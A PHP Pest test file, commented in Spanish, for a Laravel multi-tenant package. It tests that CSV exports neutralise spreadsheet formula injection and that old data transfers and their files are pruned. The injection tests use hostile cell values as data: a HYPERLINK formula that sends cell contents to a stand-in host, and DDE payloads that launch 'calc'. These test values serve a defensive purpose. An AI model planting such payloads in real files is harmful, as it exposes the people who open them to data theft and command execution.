<?php

declare(strict_types=1);

use Base\Tenant\Console\Commands\PruneTransfersCommand;
use Base\Tenant\Facades\Tenant;
use Base\Tenant\Facades\Transfer;
use Base\Tenant\Files\FileCollection;
use Base\Tenant\Files\FileStore;
use Base\Tenant\Models\DataTransfer;
use Base\Tenant\Models\File;
use Base\Tenant\Transfer\Csv;
use Illuminate\Contracts\Console\Kernel;
use Illuminate\Support\Facades\Storage;
use Illuminate\Support\Str;

beforeEach(function () {
    Storage::fake('s3');

    config([
        'base-tenant.files.driver' => 'local',
        'base-tenant.files.disk' => 's3',
    ]);

    // El proveedor lo registra una vez que se añade a su lista; hasta
    // entonces, el test no depende de ello.
    app(Kernel::class)->registerCommand(app(PruneTransfersCommand::class));
});

/**
 * Escribe y devuelve el contenido sin la marca de orden de bytes.
 *
 * @param  list<string>  $cabeceras
 * @param  list<array<int, mixed>>  $filas
 */
function csvEscrito(array $cabeceras, array $filas, ?bool $escapar = null): string
{
    $ruta = tempnam(sys_get_temp_dir(), 'csv').'.csv';

    Csv::write($ruta, $cabeceras, $filas, escapeFormulas: $escapar);

    $contenido = substr((string) file_get_contents($ruta), 3);

    @unlink($ruta);

    return $contenido;
}

// ------------------------------------------------------- Inyección de fórmulas

/**
 * Lo que un usuario escribió en su nombre acaba en la hoja de quien abre el
 * export: sin el apóstrofo, la hoja lo ejecuta.
 */
test('una celda que empieza como una fórmula sale neutralizada', function (string $celda) {
    expect(Csv::escapeFormula($celda))->toBe("'".$celda);
})->with([
    'igual' => ['=HYPERLINK("https://malo.test?"&A1;"Pulsa")'],
    'más' => ['+1+cmd|\' /C calc\'!A0'],
    'menos' => ['-2+3+cmd|\' /C calc\'!A0'],
    'arroba' => ['@SUM(1+1)*cmd|\' /C calc\'!A0'],
    'tabulador' => ["\t=1+1"],
    'retorno de carro' => ["\r=1+1"],
    'menos que no es número' => ['-1+2'],
]);

/**
 * Un número con signo no ejecuta nada, y convertirlo en texto rompería las
 * sumas de la hoja para la que se hizo el export.
 */
test('un número con signo se queda como número', function (string $celda) {
    expect(Csv::escapeFormula($celda))->toBe($celda);
})->with(['-12', '-12.5', '+3', '-0,75', '-.5', '-1e5']);

test('lo que no empieza por un carácter peligroso no se toca', function () {
    expect(Csv::escapeFormula('Ada Lovelace'))->toBe('Ada Lovelace')
        ->and(Csv::escapeFormula(''))->toBe('')
        ->and(Csv::escapeFormula('a=b'))->toBe('a=b');
});

test('escribir un CSV neutraliza filas y cabeceras por defecto', function () {
    $contenido = csvEscrito(['=cabecera', 'Importe'], [
        ['=1+1', -42],
        ['@malo', '-3.5'],
    ]);

    expect($contenido)->toContain("'=cabecera")
        ->and($contenido)->toContain("'=1+1,-42")
        ->and($contenido)->toContain("'@malo,-3.5");
});

test('la protección se puede apagar por configuración', function () {
    config(['base-tenant.transfer.csv.escape_formulas' => false]);

    expect(csvEscrito(['a'], [['=1+1']]))->toBe("a\n=1+1\n");
});

test('quien llama puede decidir por encima de la configuración', function () {
    config(['base-tenant.transfer.csv.escape_formulas' => false]);

    expect(csvEscrito(['a'], [['=1+1']], escapar: true))->toBe("a\n'=1+1\n");
});

// ---------------------------------------------------------------- Retención

/**
 * Un fichero producido por un traspaso, como lo dejarían los jobs.
 */
function ficheroDeTraspaso($cuenta, string $coleccion): File
{
    $clave = FileStore::TMP_PREFIX.'/'.Str::uuid();

    Storage::disk('s3')->put($clave, "a,b\n1,2\n");

    return app(FileStore::class)->finalize(
        key: $clave,
        collection: FileCollection::make($coleccion),
        name: 'datos.csv',
        account: $cuenta,
    );
}

function traspasoDeHace(int $dias, $cuenta, array $atributos = []): DataTransfer
{
    $traspaso = Tenant::runFor($cuenta, fn () => DataTransfer::create([
        'type' => DataTransfer::EXPORT,
        'handler' => 'lo-que-sea',
        'status' => DataTransfer::COMPLETED,
        ...$atributos,
    ]));

    $traspaso->forceFill(['created_at' => now()->subDays($dias)])->save();

    return $traspaso;
}

test('podar borra los traspasos viejos y los ficheros que generaron', function () {
    $cuenta = $this->createAccount();

    $export = ficheroDeTraspaso($cuenta, 'exports');
    $errores = ficheroDeTraspaso($cuenta, 'transfer-errors');

    $viejo = traspasoDeHace(40, $cuenta, ['file_id' => $export->getKey(), 'error_file_id' => $errores->getKey()]);
    $reciente = traspasoDeHace(5, $cuenta);

    Tenant::forget();

    expect(Transfer::prune(30))->toBe(1)
        ->and(DataTransfer::query()->acrossAccounts()->find($viejo->getKey()))->toBeNull()
        ->and(DataTransfer::query()->acrossAccounts()->find($reciente->getKey()))->not->toBeNull()
        ->and(File::query()->acrossAccounts()->find($export->getKey()))->toBeNull()
        ->and(File::query()->acrossAccounts()->find($errores->getKey()))->toBeNull()
        ->and(Storage::disk('s3')->exists($export->path))->toBeFalse()
        ->and(Storage::disk('s3')->exists($errores->path))->toBeFalse();
});

/**
 * El origen de un import es un fichero que la aplicación entregó, y puede ser
 * uno de la biblioteca que alguien sigue queriendo.
 */
test('podar no se lleva el fichero de origen de un import', function () {
    $cuenta = $this->createAccount();

    $origen = ficheroDeTraspaso($cuenta, 'library');

    traspasoDeHace(40, $cuenta, ['type' => DataTransfer::IMPORT, 'file_id' => $origen->getKey()]);

    Tenant::forget();

    expect(Transfer::prune(30))->toBe(1)
        ->and(File::query()->acrossAccounts()->find($origen->getKey()))->not->toBeNull()
        ->and(Storage::disk('s3')->exists($origen->path))->toBeTrue();
});

test('el comando aplica transfer.retention_days', function () {
    config(['base-tenant.transfer.retention_days' => 10]);

    $cuenta = $this->createAccount();

    traspasoDeHace(15, $cuenta);
    traspasoDeHace(5, $cuenta);

    Tenant::forget();

    $this->artisan('k2labs-base:prune-transfers')
        ->expectsOutputToContain('Deleted 1 transfers older than 10 days')
        ->assertSuccessful();

    expect(DataTransfer::query()->acrossAccounts()->count())->toBe(1);
});

test('el comando acepta otra ventana por opción', function () {
    $cuenta = $this->createAccount();

    traspasoDeHace(15, $cuenta);

    Tenant::forget();

    $this->artisan('k2labs-base:prune-transfers', ['--days' => 20])->assertSuccessful();

    expect(DataTransfer::query()->acrossAccounts()->count())->toBe(1);
});

test('una retención vacía no borra nada', function () {
    config(['base-tenant.transfer.retention_days' => null]);

    $cuenta = $this->createAccount();

    traspasoDeHace(400, $cuenta);

    Tenant::forget();

    $this->artisan('k2labs-base:prune-transfers')
        ->expectsOutputToContain('Transfer retention is disabled')
        ->assertSuccessful();

    expect(DataTransfer::query()->acrossAccounts()->count())->toBe(1);
});
